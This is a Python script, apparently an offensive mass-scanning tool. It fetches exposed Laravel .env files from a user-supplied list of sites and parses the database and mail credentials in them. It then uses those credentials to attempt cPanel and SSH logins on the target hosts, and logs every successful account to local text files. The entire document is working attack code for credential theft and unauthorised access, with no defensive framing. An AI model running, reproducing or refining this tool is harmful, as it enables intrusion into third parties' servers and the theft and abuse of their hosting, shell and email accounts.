import requests
import re
import paramiko
import socket
from requests.exceptions import *
from colorama import init, Fore
from concurrent.futures import ThreadPoolExecutor
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
init(autoreset=True)

class Laravel(object):
    def __init__(self, url):
        self.url = url.rstrip('/')
        self.body = None
        self.headers = None
        self.smtp = None
        self.ssh = None
        self.cpanel = None
        self.user = None
        self.paswd = None
        self.ip = None

    def checkEnv(self):
        try:
            req = requests.get(self.url + "/.env", verify=False)
            if req.status_code == 200 and "APP_ENV" in req.text:
                res = req.text.replace("\n", "##")
                bro = re.findall(r"DB_USERNAME=(.*?)##", res)[0]
                bros = re.findall(r"DB_PASSWORD=(.*?)##", res)[0]
                if "_" in bro:
                    self.user = bro.split("_")[0]
                else:
                    self.user = bro
                bross = self.url.split("/")
                self.ip = socket.gethostbyname(bross[2])
                self.paswd = bros
                self.body = req.text
                self.headers = req.headers
                return True
            return False
        except (ConnectionError, Exception):
            return False

    def loginCpanel(self):
        url = self.url.split("/")
        datas = {
            "user": self.user,
            "pass": self.paswd,
            "goto": "/"
        }
        try:
            req = requests.post(url[0] + "//" + url[2] + ":2082/login/?login_only=1", data=datas, verify=False)
            if "redirect" in req.text and "security_token" in req.text:
                self.cpanel = self.url + "|" + self.user + "|" + self.paswd
                return True
            return False
        except Exception as e:
            return False

    def loginSSH(self):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(self.ip, port=22, username=self.user, password=self.paswd, timeout=10)
            self.ssh = self.ip + "|" + self.user + "|" + self.paswd
            return True
        except (paramiko.ssh_exception.AuthenticationException, Exception):
            return False

    def checkCpanel(self):
        try:
            req = requests.get(self.url + "/cpanel", verify=False)
            if req.status_code == 200 and "<a href=\"https://go.cpanel.net/privacy\"" in req.text:
                return True
            return False
        except Exception as e:
            print("ERROR! " + str(e))

    def extractSMTP(self):
        try:
            res = self.body.replace("\n", "##")
            if "MAIL_HOST" in res:
                HOST = re.findall(r"MAIL_HOST=(.*?)##", res)[0]
                PORT = re.findall(r"MAIL_PORT=(.*?)##", res)[0]
                USER = re.findall(r"MAIL_USERNAME=(.*?)##", res)[0]
                PASS = re.findall(r"MAIL_PASSWORD=(.*?)##", res)[0]
                if "MAIL_FROM_ADDRESS" in res:
                    ADDR = re.findall(r"MAIL_FROM_ADDRESS=(.*?)##", res)[0]
                    NAME = re.findall(r"MAIL_FROM_NAME=(.*?)##", res)[0]
                    self.smtp = HOST + "|" + PORT + "|" + USER + "|" + PASS + "|" + ADDR + "|" + NAME
                if HOST == '':
                    return False
                self.smtp = HOST + "|" + PORT + "|" + USER + "|" + PASS
                return True
            else:
                return False
        except Exception as e:
            print("ERROR! " + str(e))

    def save(self):
        try:
            if self.smtp is not None:
                with open("smtp.txt", "a+") as f:
                    f.write(self.smtp + "\n")
            if self.ssh is not None:
                with open("ssh.txt", "a+") as f:
                    f.write(self.ssh + "\n")
            if self.cpanel is not None:
                with open("cpanel.txt", "a+") as f:
                    f.write(self.cpanel + "\n")
            return True
        except Exception as e:
            return False

def exploit(url):
    global cpanel_count, smtp_count, ssh_count
    p = Laravel(url)
    if p.checkEnv():
        if p.extractSMTP():
            smtp = Fore.GREEN + "[SMTP]" + Fore.RESET
            smtp_count = smtp_count + 1
        else:
            smtp = Fore.RED + "[SMTP]" + Fore.RESET

        if p.checkCpanel():
            if p.loginCpanel():
                cpanel = Fore.GREEN + "[CPANEL]" + Fore.RESET
                cpanel_count = cpanel_count + 1
            else:
                cpanel = Fore.RED + "[CPANEL]" + Fore.RESET
        else:
            cpanel = Fore.RED + "[CPANEL]" + Fore.RESET

        if p.loginSSH():
            ssh = Fore.GREEN + "[SSH]" + Fore.RESET
            ssh_count = ssh_count + 1
        else:
            ssh = Fore.RED + "[SSH]" + Fore.RESET

        print("%s | %s %s %s" % (url, smtp, cpanel, ssh))
        p.save()
    else:
        print("%s | ENV NOT FOUND" % (url))

lists = input("LIST: ")
thread = int(input("THREAD [1-10]: "))
smtp_count = 0
cpanel_count = 0
ssh_count = 0
with ThreadPoolExecutor(max_workers=int(thread)) as exc:
    for site in open(lists, "r").read().split("\n"):
        exc.submit(exploit, site)
    exc.shutdown(wait=True)
    print("TOTAL SMTP  : %d" % (smtp_count))
    print("TOTAL CPANEL: %d" % (cpanel_count))
    print("TOTAL SSH   : %d" % (ssh_count))
